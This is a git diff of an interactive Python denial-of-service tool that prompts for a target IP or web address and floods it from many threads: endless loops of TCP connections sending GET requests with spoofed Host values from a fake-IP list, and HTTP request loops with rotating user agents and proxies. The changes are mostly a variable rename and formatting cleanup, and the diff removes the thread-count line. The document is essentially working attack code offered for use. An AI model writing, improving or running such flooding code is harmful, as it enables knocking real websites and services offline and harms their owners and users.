@@ -22,6 +22,7 @@ with open('proxysocks') as file:
 with open('fakeip') as file:
     fakeip_list = ''.join(file.readlines()).strip().split('\n')
 
+
 def dosweb1(target):
     while True:
         useragent = random.choice(headersp)
@@ -60,16 +61,15 @@ def dosweb2(target):
         except requests.exceptions.ConnectionError:
             print(colorama.Fore.RED + "[-] Connection error!")
 
+
 def ddosip():
     while True:
         fake_ip = random.choice(fakeip_list)
-        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.connect((ip, port))
-        s.sendto(("GET /" + ip + " HTTP/1.1\r\n").encode('ascii'), (ip, port))
-        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (ip, port))
-        s.close()
-
-threads = 20
+        r = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        r.connect((ip, port))
+        r.sendto(("GET /" + ip + " HTTP/1.1\r\n").encode('ascii'), (ip, port))
+        r.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (ip, port))
+        r.close()
 
 print("\\-\          //-/    //-/\\-\       ==========     ||====\-\   //=====\-\ ||======-\     ")
 print(" \\-\        //-/    //-/  \\-\     ||-|     ||-|   ||    |=-|  ||     |-| || _____|-|    ")
@@ -82,7 +82,7 @@ print("Version: 1.6.3: TEST IP DDOS \n")
 
 vibor = int(input("Attack for IP or Web [1-IP; 2-Web]: "))
 
-if (vibor == 1):
+if vibor == 1:
     ip = input("IP Target: ")
     port = int(input("Port: "))
 
@@ -112,11 +112,9 @@ else:
     if not url.__contains__("."):
         exit("Invalid domain")
 
-
-
     proxyuseage = int(input("Use a proxy?[1-yes; 2-no]: "))
 
-    if (proxyuseage == 1):
+    if proxyuseage == 1:
         for i in range(0, threads):
             thr = threading.Thread(target=dosweb1, args=(url,))
             thr.start()
